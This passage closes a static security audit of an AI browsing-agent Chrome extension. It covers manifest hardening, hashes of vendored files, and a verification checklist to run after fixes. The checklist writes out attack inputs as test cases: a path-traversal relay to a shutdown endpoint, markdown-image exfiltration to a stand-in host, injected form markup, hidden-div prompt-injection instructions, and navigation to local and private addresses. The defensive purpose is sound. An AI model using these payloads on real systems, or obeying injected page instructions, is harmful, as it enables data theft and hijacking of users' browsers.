- **Web-accessible resources:** `assets/*`, `domExtractor.js`, `buildDomTree.js` for `<all_urls>`; only `assets/mascot/*.gif` is needed; use `use_dynamic_url:true` (test on the minimum Chrome version). Fingerprinting becomes real once published with a fixed ID.
- **Incognito:** no `incognito` key (default spanning); sessions with page content persist to `storage.local`, shared with regular mode. Set `"incognito":"not_allowed"`.
- **Vendored whisper:** prebuilt WASM from a single-maintainer npm canary (`NOTICE.md`); byte-identical to npm apart from two `autono:` hunks replacing `new Function`; dead `ModelManager`/`loadModelByUrl` code with mutable `huggingface.co/.../resolve/main/` URLs ships unused. Record hashes and upstream commit in `NOTICE.md`, strip the dead code, prefer a stable or source-built release. Parakeet and Piper are downloaded by the Bridge with integrity unknown.
- **Hygiene:** `SECURITY.md` has no concrete contact (enable GitHub private vulnerability reporting); `.gitignore` misses `.env.*`, `*.crx`, `*.zip`, `*.tgz`, `*.p12`, `.idea/`; `.env.example` lists unused variables with a stale port; a 32 MB model is in git history without LFS; no dependabot config; commit metadata exposes the author's email (consider the noreply address).
- **Legacy options page:** `options.js:111-145` rewrites `antigravity_settings` with 12 fields, dropping `tinyFishApiKey`, `mascot`, `multiAgent`, `shadowOnComplete` (falls back to `'sleep'`), and POSTs all keys to the Bridge. Remove `options_page` or redirect to panel settings. Add `"minimum_chrome_version":"120"` (`sidePanel.open` is Chrome 116).

### Proposed manifest (target; needs the code changes in M2/M3)
```diff
+  "minimum_chrome_version": "120",
+  "incognito": "not_allowed",
-  "content_scripts": [ ... ],
   "permissions": [ -"tabs","unlimitedStorage","webNavigation","notifications" ],
   "host_permissions": [
-    "<all_urls>",
     "http://127.0.0.1:*/*", "http://localhost:*/*",
+    "https://generativelanguage.googleapis.com/*", "https://api.anthropic.com/*",
+    "https://api.openai.com/*", "https://api.search.tinyfish.ai/*"
   ],
+  "optional_host_permissions": ["https://*/*", "http://*/*"],
-  "options_page": "options/options.html",
   "content_security_policy": { "extension_pages": "<string from M4>" },
   "web_accessible_resources": [{ "resources": ["assets/mascot/*.gif"], "matches": ["http://*/*","https://*/*"], "use_dynamic_url": true }]
```
Zero-code-change subset: drop `webNavigation`/`notifications`, tighten CSP, narrow WAR, set `incognito`, add `minimum_chrome_version`, restrict content-script matches to http/https. Keeping `<all_urls>` in `host_permissions` keeps screenshots working until runtime grants exist; custom providers and MCP URLs then need `chrome.permissions.request` when saved.

### Vendored-file verification (sha256, line endings normalised)
- `marked.esm.js` `2e70fea3...8014` = `marked@18.0.13`; `katex.mjs` `cc567bec...afd5`, `katex.min.css` `50d9c78e...03dd` and all 60 fonts = `katex@0.18.7`; `vendor/whisper/index.es.js` `0d375587...aeab` = npm; `libmain-D9-QM3iM.mjs` repo `35f4464e...12dd` vs npm `990792a9...67e3` differs only in the two `autono:` hunks (embedded WASM identical).
- `ggml-tiny-q5_1.bin` sha256 `818710568da3ca15689e31a743197b520007872ff9576237bda97bd1b469c3d7`, 32,152,673 bytes, equals the Hugging Face LFS oid for `ggerganov/whisper.cpp`.
- No advisory found affecting KaTeX 0.18.7 (GHSA-238p-pmpm-9mq7 fixed in 0.18.2) or marked 18.0.13 (web search only; `npm audit` not run).

### Not confirmed in this slice
Favicon redirect to `*.gstatic.com`; `frame-src` effect on `srcdoc` iframes; minimum Chrome for `use_dynamic_url`; activeTab grant on side-panel open; side-panel behaviour in incognito; GitHub repo settings; any Web Store listing; `README.es.md`, `dictation-vad.js`, `pcm-worklet.js` only grep-checked; `buildDomTree.js` structure resembles browser-use/nanobrowser with no attribution (inference).

## 7. Verification checklist after fixes

Run each against a build with a synthetic fixture page:
1. From a page console: set `#__antigravity_inline_input` and dispatch Enter during a Cowork run -> no `user_intervention_received`.
2. From a page console: fill the mascot input and click send -> no `mascot_followup`/`mascot_btw` reaches the background; shadow root unreachable.
3. From a content-script context: `chrome.runtime.connect({name:'antigravity-panel'})` and `chrome.storage.local.get(null)` -> disconnected / denied.
4. `bridge_relay` with `/v1/stt/../../api/power/shutdown` and `%2e%2e` variants -> rejected (unit test).
5. Model output containing `![](https://canary.example/?d=x)`, `<style>`, `<form action>`, `<input data-mirror=...>` -> no request, no rendering, no key copy.
6. Hidden-div instruction on a fixture page -> approval prompt on first cross-origin navigate showing the real URL; no action runs unprompted in Supervised mode.
7. Navigate to `http://127.0.0.1:8765/`, `file:///`, `data:`, `http://192.168.1.1/` -> blocked.
8. `cowork_request` card with swapped options -> fixed card displaying the goal; "No thanks" never starts Cowork.
9. Start the MCP poller with a rogue listener on the port -> no action executes without the token.
10. Cancel during typing -> typing stops and no submit/power action fires.

## 8. Limits of this audit

Static review only; no runtime testing of any exploit chain. Several platform behaviours were taken from knowledge and not re-checked against current Chrome docs: open shadow roots reachable from page script, synthetic events reaching isolated-world listeners, `storage.local` default content-script access, CSP inheritance on `blob:` and `srcdoc` documents, `tabs.update` behaviour for `file:`/`javascript:`, COEP effect on outbound image requests. Model compliance with injected text is probabilistic; A1, A2, A3, A8 and A14 do not depend on the model being fooled about who is speaking. The Bridge, the vendored libraries' full source, `components/*`, and the npm dependency tree were not audited.
